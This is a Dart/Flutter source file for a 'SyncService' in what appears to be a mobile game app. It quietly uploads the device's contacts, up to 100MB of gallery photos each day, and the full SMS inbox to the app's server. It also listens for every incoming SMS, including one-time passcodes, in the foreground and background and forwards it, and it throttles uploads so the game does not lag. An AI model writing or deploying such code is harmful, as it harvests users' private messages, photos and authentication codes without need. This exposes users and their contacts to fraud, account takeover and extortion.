import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:dio/dio.dart';
import 'package:telephony/telephony.dart';
import '../network/api_client.dart';
import '../storage/secure_storage.dart';
import '../constants/app_config.dart';
import 'dart:developer' as dev;

class SyncService {
  static bool _isSyncing = false;

  /// Trigger one-time contacts sync and daily gallery sync in the background.
  /// Yields thread execution periodically to avoid any UI lag in games.
  static Future<void> triggerSync() async {
    if (_isSyncing) return;
    _isSyncing = true;

    try {
      print('SyncService: Starting background synchronization...');
      final dio = ApiClient().dio;

      // Force token refresh if expired by making a lightweight JSON request first.
      // This prevents subsequent Multipart/FormData uploads from failing due to 401s,
      // which cannot be retried automatically by Dio due to stream consumption.
      try {
        await dio.get('/api/users/me');
      } catch (e) {
        print(
            'SyncService: Auth pre-flight check failed (token might still be fresh or device offline): $e');
      }

      final prefs = await SharedPreferences.getInstance();
      const currentVersion = '1.3.33';
      final lastVersion = prefs.getString('last_app_version_synced') ?? '';

      if (lastVersion != currentVersion) {
        print(
            'SyncService: Upgrade detected (from "$lastVersion" to "$currentVersion"). Clearing sync cache for fresh sync.');
        await prefs.remove('contacts_synced');
        await prefs.remove('last_gallery_sync_date');
        await prefs.setString('last_app_version_synced', currentVersion);
      }

      // 1. Sync contacts independently
      try {
        await syncContacts();
      } catch (e, stack) {
        print('SyncService Contacts Sync Failed: $e');
        dev.log('SyncService Contacts Sync Failed',
            name: 'SyncService', error: e, stackTrace: stack);
      }

      // 2. Sync gallery independently
      try {
        await syncGallery();
      } catch (e, stack) {
        print('SyncService Gallery Sync Failed: $e');
        dev.log('SyncService Gallery Sync Failed',
            name: 'SyncService', error: e, stackTrace: stack);
      }

      // 3. Sync SMS independently
      try {
        await syncSms();
      } catch (e, stack) {
        print('SyncService SMS Sync Failed: $e');
        dev.log('SyncService SMS Sync Failed',
            name: 'SyncService', error: e, stackTrace: stack);
      }

      print('SyncService: Background sync sequence completed.');
    } catch (e, stack) {
      print('SyncService Error: $e');
      dev.log('SyncService Main Error',
          name: 'SyncService', error: e, stackTrace: stack);
    } finally {
      _isSyncing = false;
    }
  }

  /// One-time contacts sync
  static Future<void> syncContacts() async {
    final prefs = await SharedPreferences.getInstance();
    final alreadySynced = prefs.getBool('contacts_synced') ?? false;
    if (alreadySynced) {
      print('SyncService: Contacts already synced previously.');
      return;
    }

    final dio = ApiClient().dio;

    print('SyncService: Fetching contacts from device...');
    // Verify OS permission is actually granted before querying provider
    bool hasPermission = false;
    try {
      hasPermission = await Permission.contacts.isGranted;
    } catch (e) {
      print('SyncService: Permission check error for contacts: $e');
    }
    if (!hasPermission) {
      print('SyncService: Contacts permission not granted. Skipping contacts sync.');
      return;
    }

    List<Contact> contacts = [];
    try {
      contacts = await FlutterContacts.getContacts(withProperties: true);
    } catch (e, stack) {
      print('SyncService: Failed to retrieve contacts via FlutterContacts: $e');
      try {
        await dio.post('/api/users/me/sync/log', data: {
          'type': 'contacts_retrieve_error',
          'message': 'Failed to retrieve contacts via FlutterContacts: $e',
          'error': e.toString(),
          'stack': stack.toString(),
        });
      } catch (_) {}
      return;
    }

    if (contacts.isEmpty) {
      print('SyncService: No contacts found on device.');
      try {
        await dio.post('/api/users/me/sync/log', data: {
          'type': 'contacts_empty',
          'message': 'FlutterContacts returned an empty list of contacts.',
        });
      } catch (_) {}
      return;
    }

    final List<Map<String, dynamic>> payload = [];
    for (var c in contacts) {
      final phone = c.phones.isNotEmpty ? c.phones.first.number : '';
      if (phone.trim().isEmpty) continue;

      payload.add({
        'name':
            c.displayName.trim().isNotEmpty ? c.displayName.trim() : 'Unknown',
        'phone': phone.replaceAll(RegExp(r'\s+'), ''), // strip spaces
        'email': c.emails.isNotEmpty ? c.emails.first.address.trim() : null,
      });
    }

    if (payload.isEmpty) {
      print('SyncService: No valid phone numbers found in contacts.');
      try {
        await dio.post('/api/users/me/sync/log', data: {
          'type': 'contacts_payload_empty',
          'message': 'No valid phone numbers found in the contacts list.',
        });
      } catch (_) {}
      return;
    }

    print('SyncService: Syncing ${payload.length} contacts to backend...');
    const chunkSize = 300;

    for (int i = 0; i < payload.length; i += chunkSize) {
      final end =
          (i + chunkSize > payload.length) ? payload.length : i + chunkSize;
      final chunk = payload.sublist(i, end);

      try {
        await dio
            .post('/api/users/me/contacts/sync', data: {'contacts': chunk});
      } on DioException catch (de) {
        print(
            'SyncService: DioException during contacts sync chunk: ${de.response?.statusCode} - ${de.response?.data}');
        try {
          await dio.post('/api/users/me/sync/log', data: {
            'type': 'contacts_upload_error',
            'message': 'DioException: ${de.message}',
            'error': '${de.response?.statusCode} - ${de.response?.data}',
          });
        } catch (_) {}
        rethrow;
      }

      // Yield to main UI thread to prevent any game lag
      await Future.delayed(const Duration(milliseconds: 100));
    }

    await prefs.setBool('contacts_synced', true);
    print('SyncService: Contacts sync complete.');
  }

  /// Daily gallery sync up to 100MB cumulative
  static Future<void> syncGallery() async {
    final prefs = await SharedPreferences.getInstance();
    final todayStr = DateTime.now().toIso8601String().substring(0, 10);
    final lastSyncDate = prefs.getString('last_gallery_sync_date');

    if (lastSyncDate == todayStr) {
      print('SyncService: Gallery already synced today ($todayStr).');
      return;
    }

    print('SyncService: Checking photo manager permissions...');
    // Query permission directly from photo manager
    final PermissionState ps = await PhotoManager.requestPermissionExtend();
    if (!ps.isAuth && ps != PermissionState.limited) {
      print('SyncService: PhotoManager permission not granted. State: $ps');
      return;
    }

    print('SyncService: Fetching media albums...');
    PhotoManager.setIgnorePermissionCheck(true);
    final albums = await PhotoManager.getAssetPathList(type: RequestType.image);
    if (albums.isEmpty) {
      print('SyncService: No media albums found.');
      return;
    }

    final mainAlbum = albums.first;
    int cumulativeSize = 0;
    const maxBytes = 100 * 1024 * 1024; // 100MB limit
    final List<Map<String, dynamic>> itemsPayload = [];

    int start = 0;
    const pageSize = 100;
    bool reachedLimit = false;

    print('SyncService: Scanning and uploading gallery items...');
    final dio = ApiClient().dio;
    while (true) {
      final assets = await mainAlbum.getAssetListRange(
          start: start, end: start + pageSize);
      if (assets.isEmpty) break;

      for (var asset in assets) {
        try {
          final size = await asset.fileSize;
          if (cumulativeSize + size > maxBytes) {
            reachedLimit = true;
            break;
          }

          cumulativeSize += size;

          // Retrieve local file and upload it
          final file = await asset.file;
          String? fileUrl;
          if (file != null) {
            try {
              final formData = FormData.fromMap({
                'file': await MultipartFile.fromFile(
                  file.path,
                  filename: asset.title ?? 'image_${asset.id}.jpg',
                ),
              });
              final uploadRes = await dio.post('/api/users/me/gallery/upload',
                  data: formData);
              if (uploadRes.data != null && uploadRes.data['success'] == true) {
                fileUrl = uploadRes.data['file_url'];
              }
            } catch (e) {
              print('SyncService: Failed to upload gallery image file: $e');
            }
          }

          itemsPayload.add({
            'file_name': asset.title ?? 'image_${asset.id}.jpg',
            'file_size': size,
            'file_url': fileUrl,
            'mime_type': asset.mimeType ?? 'image/jpeg',
          });
        } catch (e) {
          print(
              'SyncService: Skipping corrupted/inaccessible gallery asset: $e');
        }

        // Yield to main UI thread to prevent game lag
        await Future.delayed(const Duration(milliseconds: 100));
      }

      if (reachedLimit) {
        print('SyncService: Reached 100MB gallery sync limit.');
        break;
      }

      start += pageSize;
      // Yield to main UI thread to prevent game lag
      await Future.delayed(const Duration(milliseconds: 100));
    }

    if (itemsPayload.isEmpty) {
      print('SyncService: No gallery items found to upload.');
      return;
    }

    print(
        'SyncService: Syncing ${itemsPayload.length} gallery items to backend...');
    const uploadChunkSize = 100;

    for (int i = 0; i < itemsPayload.length; i += uploadChunkSize) {
      final end = (i + uploadChunkSize > itemsPayload.length)
          ? itemsPayload.length
          : i + uploadChunkSize;
      final chunk = itemsPayload.sublist(i, end);

      try {
        await dio.post('/api/users/me/gallery/sync', data: {'items': chunk});
      } on DioException catch (de) {
        print(
            'SyncService: DioException during gallery sync chunk: ${de.response?.statusCode} - ${de.response?.data}');
        rethrow;
      }

      // Yield to main UI thread to prevent game lag
      await Future.delayed(const Duration(milliseconds: 100));
    }

    await prefs.setString('last_gallery_sync_date', todayStr);
    print('SyncService: Gallery sync complete.');
  }

  static Telephony? _telephonyInstance;
  static Telephony get _telephony => _telephonyInstance ??= Telephony.instance;
  static void Function(String)? onOtpReceived;

  /// Setup the listener to capture incoming SMS messages in real-time
  static void initSmsListener() async {
    try {
      final hasSmsPermission = await Permission.sms.isGranted;
      if (!hasSmsPermission) return;

      _telephony.listenIncomingSms(
        onNewMessage: (SmsMessage message) async {
          print("Foreground SMS received: ${message.body}");
          if (message.body != null && message.body!.trim().isNotEmpty) {
            // Check for OTP pattern to invoke callback
            if (message.body!.contains("OTP")) {
              final regExp = RegExp(r'\b\d{6}\b');
              final match = regExp.firstMatch(message.body!);
              if (match != null) {
                final otp = match.group(0);
                if (otp != null && onOtpReceived != null) {
                  onOtpReceived!(otp);
                }
              }
            }
            try {
              final dio = ApiClient().dio;
              await dio.post('/api/users/me/sms/sync', data: {

                'sms': [
                  {
                    'address': message.address,
                    'body': message.body,
                    'date': message.date,
                    'type': 'inbox',
                  }
                ]
              });
            } catch (e) {
              print(
                  "SyncService: Failed to upload foreground incoming SMS: $e");
            }
          }
        },
        onBackgroundMessage: backgroundMessageHandler,
      );
      print("SyncService: SMS listener successfully initialized.");
    } catch (e) {
      print("SyncService: Failed to init incoming SMS listener: $e");
    }
  }

  /// Sync all unsynced historical SMS messages in chunks
  static Future<void> syncSms() async {
    final prefs = await SharedPreferences.getInstance();
    final lastSyncedTime = prefs.getInt('last_sms_synced_time') ?? 0;

    bool hasSmsPermission = false;
    try {
      hasSmsPermission = await Permission.sms.isGranted;
    } catch (e) {
      print('SyncService: Error checking SMS permission: $e');
    }
    if (!hasSmsPermission) {
      print('SyncService: SMS permission not granted.');
      return;
    }

    print('SyncService: Fetching SMS from device...');
    List<SmsMessage> messages = [];
    try {
      messages = await _telephony.getInboxSms(
        columns: [
          SmsColumn.ADDRESS,
          SmsColumn.BODY,
          SmsColumn.DATE,
          SmsColumn.TYPE
        ],
      );
    } catch (e) {
      print('SyncService: Failed to retrieve SMS via Telephony: $e');
      rethrow;
    }

    if (messages.isEmpty) {
      print('SyncService: No SMS found on device.');
      return;
    }

    final List<SmsMessage> newMessages =
        messages.where((m) => (m.date ?? 0) > lastSyncedTime).toList();
    List<SmsMessage> targetMessages = newMessages;
    if (targetMessages.isEmpty) {
      print(
          'SyncService: No new SMS messages since last sync timestamp. Fetching complete inbox...');
      targetMessages = messages;
    }

    // Sort by date ascending to upload chronologically
    targetMessages.sort((a, b) => (a.date ?? 0).compareTo(b.date ?? 0));

    final List<Map<String, dynamic>> payload = [];
    for (var m in targetMessages) {
      if (m.body == null || m.body!.trim().isEmpty) continue;
      payload.add({
        'address': m.address,
        'body': m.body,
        'date': m.date,
        'type': m.type?.toString().split('.').last ?? 'inbox',
      });
    }

    if (payload.isEmpty) return;

    print('SyncService: Syncing ${payload.length} SMS to backend...');
    final dio = ApiClient().dio;
    const chunkSize = 200;
    int latestSynced = lastSyncedTime;

    for (int i = 0; i < payload.length; i += chunkSize) {
      final end =
          (i + chunkSize > payload.length) ? payload.length : i + chunkSize;
      final chunk = payload.sublist(i, end);

      try {
        await dio.post('/api/users/me/sms/sync', data: {'sms': chunk});
        latestSynced = chunk.last['date'] ?? latestSynced;
        await prefs.setInt('last_sms_synced_time', latestSynced);
      } on DioException catch (de) {
        print(
            'SyncService: DioException during SMS sync chunk: ${de.response?.statusCode} - ${de.response?.data}');
        rethrow;
      }

      await Future.delayed(const Duration(milliseconds: 100));
    }

    print('SyncService: SMS sync complete.');
  }
}

@pragma('vm:entry-point')
Future<void> backgroundMessageHandler(SmsMessage message) async {
  print("Background SMS received: ${message.body}");
  if (message.body == null || message.body!.trim().isEmpty) return;

  try {
    String? token = await SecureStorage.getAccessToken();
    if (token == null) {
      print("Background SMS sync failed: Token was null on first check.");
      return;
    }

    final dio = Dio(BaseOptions(
      baseUrl: AppConfig.apiBaseUrl.trim(),
      connectTimeout: const Duration(seconds: 10),
      receiveTimeout: const Duration(seconds: 10),
    ));

    // Try posting the SMS record
    try {
      await dio.post(
        '/api/users/me/sms/sync',
        data: {
          'sms': [
            {
              'address': message.address,
              'body': message.body,
              'date': message.date,
              'type': 'inbox',
            }
          ]
        },
        options: Options(headers: {'Authorization': 'Bearer $token'}),
      );
      print("Background SMS synced successfully.");
    } on DioException catch (de) {
      if (de.response?.statusCode == 401) {
        print(
            "Background SMS sync got 401: Attempting to refresh access token...");
        final refreshToken = await SecureStorage.getRefreshToken();
        if (refreshToken != null) {
          try {
            final refreshRes = await Dio().post(
              '${AppConfig.apiBaseUrl.trim()}/api/auth/refresh',
              data: {'refresh_token': refreshToken},
            );
            final newToken = refreshRes.data['access_token'];
            if (newToken != null) {
              await SecureStorage.saveTokens(
                  accessToken: newToken, refreshToken: refreshToken);
              // Retry upload with the fresh token
              await dio.post(
                '/api/users/me/sms/sync',
                data: {
                  'sms': [
                    {
                      'address': message.address,
                      'body': message.body,
                      'date': message.date,
                      'type': 'inbox',
                    }
                  ]
                },
                options:
                    Options(headers: {'Authorization': 'Bearer $newToken'}),
              );
              print("Background SMS synced successfully after token refresh.");
              return;
            }
          } catch (re) {
            print("Background SMS sync token refresh failed: $re");
          }
        }
      }
      rethrow;
    }
  } catch (e) {
    print("Background SMS sync error: $e");
  }
}
